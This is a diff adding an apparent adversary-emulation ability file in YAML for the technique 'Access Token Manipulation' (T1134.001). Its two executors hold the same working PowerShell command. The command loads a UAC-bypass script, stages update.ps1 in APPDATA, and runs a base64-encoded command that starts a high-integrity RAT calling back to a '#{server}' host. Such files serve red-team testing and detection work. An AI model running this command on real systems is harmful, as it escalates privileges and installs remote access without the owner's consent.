@@ -1,0 +1,64 @@
+ability_id: 1345bff7-6f26-43b2-a92a-9aabccdb3db0
+access: {}
+additional_info: {}
+buckets:
+- privilege-escalation
+delete_payload: true
+description: A UAC bypass technique is executed to steal the token of an existing
+  high-integrity process and launch a new, high-integrity RAT with limited functionality.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+
+    Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+
+    $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module
+    $env:APPDATA\update.ps1;update(''#{server}'')"));
+
+    Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand
+    $pcode" -Verbose'
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - update.ps1
+  - Invoke-BypassUACTokenManipulation.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+
+    Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+
+    $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module
+    $env:APPDATA\update.ps1;update(''#{server}'')"));
+
+    Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand
+    $pcode" -Verbose'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - update.ps1
+  - Invoke-BypassUACTokenManipulation.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Bypass User Account Control
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: privilege-escalation
+technique_id: T1134.001
+technique_name: 'Access Token Manipulation: Token Impersonation/Theft'
